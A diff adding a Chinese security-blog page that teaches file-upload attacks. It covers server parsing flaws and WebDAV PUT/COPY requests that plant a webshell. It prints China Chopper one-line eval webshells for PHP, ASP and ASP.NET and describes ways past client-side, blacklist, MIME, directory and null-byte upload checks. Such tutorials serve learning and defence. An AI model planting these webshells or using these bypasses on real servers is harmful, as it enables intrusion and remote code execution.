@@ -1,0 +1,1411 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>上传漏洞 | txjg blog</title>
+
+  <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://cdn.jsdelivr.net/gh/inkss/fontawesome@5.15.3/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+    <script>
+        var themeModelId = '5';
+        if (themeModelId) {
+            localStorage.setItem('modelId', themeModelId);
+        }
+    </script>
+    
+    <script src="https://cdn.jsdelivr.net/gh/yuang01/live2d-widget@latest/autoload.js"></script>
+    <script>
+        var live2dOpen = eval('true') || false;
+        if (!live2dOpen) {
+            localStorage.setItem('waifu-display', 1609323474481);
+        }
+    </script>
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+  
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+  
+  <!-- 依赖于jquery和vue -->
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+
+  
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/vue@2.6.11/dist/vue.min.js"></script>
+
+  
+  
+  <body>
+    <!-- 预加载动画 -->
+    <!-- 页面预加载动画 -->
+
+<div id='loader'>
+  <link rel="stylesheet" href="/js/loaded/index.css" >
+  <div class="loading-left-bg"></div>
+  <div class="loading-right-bg"></div>
+  <div class="spinner-box">
+    <div class="configure-border-1">
+      <div class="configure-core"></div>
+    </div>
+    <div class="configure-border-2">
+      <div class="configure-core"></div>
+    </div>
+    <div class="loading-word">加载中...</div>
+  </div>
+</div>
+
+<script>
+  var endLoading = function () {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('DOMContentLoaded',endLoading);
+  
+</script>
+
+    
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (href, before, media, attributes) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header   " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo" src="/medias/logo.png" alt="logo">
+      <h3 class="drawer-box-head_title">txjg blog</h3>
+      <h5 class="drawer-box-head_desc"></h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/archives" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/categories" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="/medias/logo.png" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">txjg blog</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/archives" class="menu-item-link" title="归档">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/categories" class="menu-item-link" title="分类">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">本地搜索</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="请输入关键字"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+ <!-- prismjs 代码高亮 -->
+ 
+    
+    <link href="/js/prism/prism-line-numbers.css" rel="stylesheet">
+    
+        <link href="/js/prism/prism-twilight.min.css" rel="stylesheet">
+    
+
+    <style>
+        pre[class*="language-"] {
+            overflow-y: hidden;
+        }
+        .line-numbers .line-numbers-rows {
+            border: none;
+        }
+    </style>
+  
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('/medias/15.jpg')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        上传漏洞
+      </span>
+    </div>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> 发表于：2021-12-15 |
+        </span>
+      
+
+      
+        <span class="post-detail-header_categories">
+          <i class="iconfont iconbookmark1"></i> 分类：
+          
+            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-detail-header_category">
+              web安全
+            </a>
+          
+        </span>
+      
+
+      
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="row justify-position" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h1 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h1><h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="IIS-6-0解析漏洞："><a href="#IIS-6-0解析漏洞：" class="headerlink" title="IIS 6.0解析漏洞："></a>IIS 6.0解析漏洞：</h3><ul>
+<li>当建立*.asa或*.asp目录时(如1.asa或1.asp目录),其目录下的所有文件会被IIS当作asp文件来解析</li>
+<li>当文件为*.asp;1.jpg时(如test.asp;1.jpg),该文件也会被IIS以asp脚本来执行</li>
+</ul>
+<h3 id="WebDav漏洞-服务器开启webdav扩展，并且支持put-move-copy-delete等方法-："><a href="#WebDav漏洞-服务器开启webdav扩展，并且支持put-move-copy-delete等方法-：" class="headerlink" title="WebDav漏洞(服务器开启webdav扩展，并且支持put,move,copy,delete等方法)："></a>WebDav漏洞(服务器开启webdav扩展，并且支持put,move,copy,delete等方法)：</h3><p>WebDav(web-based distributed authoring and versioning),是一种基于HTTP1.1协议的通信协议，它扩展了HTTP协议</p>
+<h4 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h4><h5 id="通过options方法探测服务器支持的HTTP方法："><a href="#通过options方法探测服务器支持的HTTP方法：" class="headerlink" title="通过options方法探测服务器支持的HTTP方法："></a>通过options方法探测服务器支持的HTTP方法：</h5><pre class="line-numbers language-none"><code class="language-none">OPTIONS &#x2F; HTTP&#x2F;1.1
+Host: www.secbug.org<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h5 id="通过put方法向服务器上传脚本文件："><a href="#通过put方法向服务器上传脚本文件：" class="headerlink" title="通过put方法向服务器上传脚本文件："></a>通过put方法向服务器上传脚本文件：</h5><pre class="line-numbers language-none"><code class="language-none">PUT &#x2F;a.txt HTTP&#x2F;1.1
+Host:www.secbug.org
+Content-Length:30
+            
+&lt;% eval request(&quot;chopper&quot;)%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h5 id="通过move或copy方法改名"><a href="#通过move或copy方法改名" class="headerlink" title="通过move或copy方法改名:"></a>通过move或copy方法改名:</h5><pre class="line-numbers language-none"><code class="language-none">COPY &#x2F;a.txt HTTP&#x2F;1.1
+Host: www.secbug.org      	
+Destination:http:&#x2F;&#x2F;www.secbug.org&#x2F;cmd.asp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h4 id="删除服务器任意文件"><a href="#删除服务器任意文件" class="headerlink" title="删除服务器任意文件:"></a>删除服务器任意文件:</h4><pre class="line-numbers language-none"><code class="language-none">DELETE &#x2F;a.txt HTTP&#x2F;1.1
+Host: www.secbug.org<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h4 id="探测目标服务器是否存在WebDav的安全隐患："><a href="#探测目标服务器是否存在WebDav的安全隐患：" class="headerlink" title="探测目标服务器是否存在WebDav的安全隐患："></a>探测目标服务器是否存在WebDav的安全隐患：</h4><p>工具：IIS Write</p>
+<h3 id="Apache解析漏洞："><a href="#Apache解析漏洞：" class="headerlink" title="Apache解析漏洞："></a>Apache解析漏洞：</h3><h4 id="版本："><a href="#版本：" class="headerlink" title="版本："></a>版本：</h4><p>apache 1.x , apache 2.x</p>
+<h4 id="apache解析文件原则："><a href="#apache解析文件原则：" class="headerlink" title="apache解析文件原则："></a>apache解析文件原则：</h4><p>当碰到不认识的扩展名时，将会从后向前解析，直到碰到认识的扩展名为止；如果都不认识，则会暴露其源代码</p>
+<h4 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h4><p>1.php.rar.as.ss #apache首先解析ss扩展名，如果不认识，就会解析as扩展名，如果不认识，接着就会解析rar扩展名，如果不认识，就会再解析php扩展名，php认识的话，就会把该文件以php脚本来解析</p>
+<h4 id="Apache认识的扩展名："><a href="#Apache认识的扩展名：" class="headerlink" title="Apache认识的扩展名："></a>Apache认识的扩展名：</h4><p>Apache安装目录&#x2F;config&#x2F;mime.types中定义</p>
+<h3 id="PHP-CGI解析漏洞-nginx解析漏洞"><a href="#PHP-CGI解析漏洞-nginx解析漏洞" class="headerlink" title="PHP CGI解析漏洞(nginx解析漏洞):"></a>PHP CGI解析漏洞(nginx解析漏洞):</h3><h4 id="例"><a href="#例" class="headerlink" title="例:"></a>例:</h4><p><a target="_blank" rel="noopener" href="http://www.secbug.org/1.jpg/1.php">http://www.secbug.org/1.jpg/1.php</a><br>注:1.php并不存在，1.jpg会被以php脚本来解析<br>(1.php不是特定的，可以是*.php)</p>
+<h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>在php的配置文件中有一个关键的选项：<br>cgi.fix_pathinfo ,这个选项在某些php版本中是默认开启的,在开启时访问url, 例：<a target="_blank" rel="noopener" href="http://www.secbug.org/a.txt/a.php">http://www.secbug.org/a.txt/a.php</a> ,由于a.php是不存在的，所以PHP将会向前递归解析，将前面的a.txt以php脚本来解析，于是造成了解析漏洞。<br>注：此漏洞与nginx关系不大，但由于nginx与php配合很容易造成这种解析漏洞，所以PHP CGI漏洞常常被认为是nginx解析漏洞</p>
+<h2 id="绕过上传漏洞"><a href="#绕过上传漏洞" class="headerlink" title="绕过上传漏洞"></a>绕过上传漏洞</h2><h3 id="程序员防护上传漏洞的措施"><a href="#程序员防护上传漏洞的措施" class="headerlink" title="程序员防护上传漏洞的措施"></a>程序员防护上传漏洞的措施</h3><h4 id="客户端检测："><a href="#客户端检测：" class="headerlink" title="客户端检测："></a>客户端检测：</h4><p>客户端使用javascript检测，在文件未上传时，就对文件进行验证</p>
+<h4 id="服务器端检测："><a href="#服务器端检测：" class="headerlink" title="服务器端检测："></a>服务器端检测：</h4><p>服务端脚本一般会检测文件的MIME类型，检测文件扩展名是否合法，甚至有些会检测文件中是否嵌入恶意代码</p>
+<h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><h4 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h4><p><a target="_blank" rel="noopener" href="http://www.maicaidao.com/">http://www.maicaidao.com</a></p>
+<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP:"></a>PHP:</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'caidao'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP:"></a>ASP:</h5><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;%eval request(&quot;caidao&quot;)%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5 id="ASP-NET"><a href="#ASP-NET" class="headerlink" title="ASP.NET:"></a>ASP.NET:</h5><pre class="line-numbers language-asp.net" data-language="asp.net"><code class="language-asp.net">&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;chopper&quot;],&quot;unsafe&quot;);%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="制作图片一句话木马"><a href="#制作图片一句话木马" class="headerlink" title="制作图片一句话木马"></a>制作图片一句话木马</h3><p>制作软件：Edjpgcom</p>
+<h3 id="客户端检测绕过"><a href="#客户端检测绕过" class="headerlink" title="客户端检测绕过"></a>客户端检测绕过</h3><h4 id="FireBug绕过客户端检测"><a href="#FireBug绕过客户端检测" class="headerlink" title="FireBug绕过客户端检测"></a>FireBug绕过客户端检测</h4><h5 id="FireBug介绍"><a href="#FireBug介绍" class="headerlink" title="FireBug介绍"></a>FireBug介绍</h5><p>FireBug是一款开源的浏览器插件；它支持Firefox、Chrome等浏览器。它可以让Web开发者轻松地调试HTML、JavaScript、AJAX、CSS等前端脚本代码。FireBug像一把瑞士军刀，从不同的角度剖析Web页面内部的细节层面，属于Web开发人员的必备武器。正由于FireBug功能强大，所以也被黑客认为是必备利器。</p>
+<h5 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h5><p>当单击“提交”按钮时，form表单就会触发onsubmit事件，该事件就会调用对应的函数或脚本(比如示例中的checkFile函数)对上传的文件的后缀名进行检测，如果后缀名合法，返回一个布尔值true,则提交表单到服务器；否则，返回一个布尔值false,程序退出，文件将无法提交到服务器。</p>
+<ul>
+<li>示例代码<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onsubmit</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">checkFile</span><span class="token punctuation">"</span></span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+使用FireBug将onsubmit事件删除，就可以绕过javascript函数(如checkFile)的验证</li>
+</ul>
+<h4 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h4><h5 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h5><p>首先将木马文件的扩展名改为合法的扩展名，由于扩展名是合法的，因此就可以通过客户端javascript验证,然后在上传时我们使用burpsuite拦截上传数据，将木马文件的扩展名再改回为原来的脚本扩展名(如：php),就可以绕过客户端验证。</p>
+<h5 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h5><p>在HTTP协议中有请求头Content-Length,代表实体正文长度，如果此时的 filename 修改也就意味着实体正文长度增加或者减少了，这时就应该修改 Content-Length请求头，如：Content-Length长度为200,把文件流中的 filename&#x3D;”xxser.jpg”修改为 filename&#x3D;＂1.php”。更改后，实体正文少了4个字符，所以需要把Content-Length修改 为196,如果不修改上传可能会失败。</p>
+<h3 id="服务器端检测绕过"><a href="#服务器端检测绕过" class="headerlink" title="服务器端检测绕过"></a>服务器端检测绕过</h3><h4 id="白名单与黑名单验证绕过"><a href="#白名单与黑名单验证绕过" class="headerlink" title="白名单与黑名单验证绕过"></a>白名单与黑名单验证绕过</h4><h5 id="黑名单验证绕过"><a href="#黑名单验证绕过" class="headerlink" title="黑名单验证绕过"></a>黑名单验证绕过</h5><ul>
+<li>黑名单原理<br><em><strong>黑名单过滤是一种不安全的方式</strong></em>，黑名单定义了一系列不安全的扩展名，服务器端在接收文件后，与黑名单扩展名对比，如果发现文件扩展名与黑名单里的扩展名匹配，则认为文件不合法</li>
+<li>黑名单绕过方法<ul>
+<li>攻击者可以上传黑名单中忽略的扩展名的脚本文件</li>
+<li>假如服务端代码对上传的文件的后缀名没有做大小写转换，可以通过上传一些后缀名中掺杂大小写的脚本文件，而该扩展名又未包含在黑名单中，由于Windows大小写不敏感，因此此类扩展名依然会被windows平台的web容器解析</li>
+<li>在Windows系统下，当文件名以点（.）或者空格（ ）结尾时，Windows会自动去除点（.）或空格，利用这一特性，可以上传xxx.asp.或xxx.asp （p后面为空格）,服务端在接收到文件名后进行写文件操作时，Windows将会自动去除结尾的.或空格</li>
+</ul>
+</li>
+</ul>
+<h5 id="白名单验证绕过"><a href="#白名单验证绕过" class="headerlink" title="白名单验证绕过"></a>白名单验证绕过</h5><ul>
+<li>白名单原理<br><em><strong>白名单比黑名单安全，但并不能完全防御上传漏洞</strong></em>，白名单规定了允许上传的后缀名，上传的文件后缀名在白名单中，则允许上传，否则不允许上传</li>
+<li>白名单绕过方法<br>搭配web容器的解析漏洞，可以上传类似xx.asp;1.jpg文件，由于jpg是合法的后缀名，因此就可以通过白名单验证上传该文件，又由于目标服务器存在解析漏洞（假设为iis 6.0解析漏洞），则该xx.asp;1.jpg就会以asp脚本来解析</li>
+<li>注：<em><strong>白名单机制仅仅是防御上传漏洞的第一步</strong></em></li>
+</ul>
+<h4 id="MIME验证绕过"><a href="#MIME验证绕过" class="headerlink" title="MIME验证绕过"></a>MIME验证绕过</h4><h5 id="MIME验证原理"><a href="#MIME验证原理" class="headerlink" title="MIME验证原理"></a>MIME验证原理</h5><p>服务端代码会对上传文件请求数据中的Content-Type做验证，如果Content-Type是合法的,就允许上传，否则不允许上传</p>
+<h5 id="MIME验证绕过-1"><a href="#MIME验证绕过-1" class="headerlink" title="MIME验证绕过"></a>MIME验证绕过</h5><p>使用burpsuite拦截上传文件请求数据包，将要上传文件的不合法的Content-Type改为合法的即可绕过MIME验证</p>
+<h4 id="目录验证利用"><a href="#目录验证利用" class="headerlink" title="目录验证利用"></a>目录验证利用</h4><h5 id="目录验证原理"><a href="#目录验证原理" class="headerlink" title="目录验证原理"></a>目录验证原理</h5><p>在文件上传时，程序通常允许用户将文件放到指定的目录中。有些web开发人员为了让代码更“健壮”，通常会做一个操作：<em><strong>如果指定的目录存在，就将文件写入目录中，不存在则先建立目录，然后再写入</strong></em>，由于文件上传时默认的文件夹可以在html隐藏标签中定义</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Extension<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>input</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5 id="目录验证利用方法"><a href="#目录验证利用方法" class="headerlink" title="目录验证利用方法"></a>目录验证利用方法</h5><p>假如目标服务器存在IIS 6.0解析漏洞,我们就可以使用FireBug将value的值改为xxx.asp,服务端首先会判断该xxx.asp目录是否存在，自然不存在，服务器端就会创建xxx.asp目录，这时我们就可以上传包含asp一句话木马的任意文件，该文件就会上传到xxx.asp目录中，由于存在IIS 6.0解析漏洞，xxx.asp目录下的所有文件都会以asp来解析，因此获取webshell</p>
+<h4 id="截断上传攻击"><a href="#截断上传攻击" class="headerlink" title="截断上传攻击"></a>截断上传攻击</h4><h5 id="截断上传攻击原理"><a href="#截断上传攻击原理" class="headerlink" title="截断上传攻击原理"></a>截断上传攻击原理</h5><p><em><strong>截断上传攻击在ASP程序中最常见</strong></em><br>核心原理： <em><strong>%00截断</strong></em></p>
+<h5 id="截断上传攻击方法"><a href="#截断上传攻击方法" class="headerlink" title="截断上传攻击方法"></a>截断上传攻击方法</h5><p>使用burp拦截文件上传请求数据，将文件上传名称更改为1.asp空格xxx.jpg，然后单击HEX选项卡进入十六进制编辑模式，将文件名中空格的十六进制数20改为00，即NULL,单击GO按钮，可以发现最终上传的文件为1.asp,1.asp后面的字符已经被截断</p>
+<h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><ul>
+<li>文件上传名称的位置（下图中的filename&#x3D;”xxser.jpg”）<br><img src="/1.png"></li>
+<li>截断上传漏洞不仅出现在asp程序上，在php,jsp程序中也存在这样的问题</li>
+</ul>
+<h2 id="文本编辑器上传漏洞"><a href="#文本编辑器上传漏洞" class="headerlink" title="文本编辑器上传漏洞"></a>文本编辑器上传漏洞</h2><h3 id="常见的文本编辑器"><a href="#常见的文本编辑器" class="headerlink" title="常见的文本编辑器"></a>常见的文本编辑器</h3><p>CKEditor,Ewebeditor,UEditor,KindEditor,XHeditor等，这类编辑器的功能非常类似，比如都有图片上传，视频上传，远程下载等功能。这类文本编辑器也称为富文本编辑器</p>
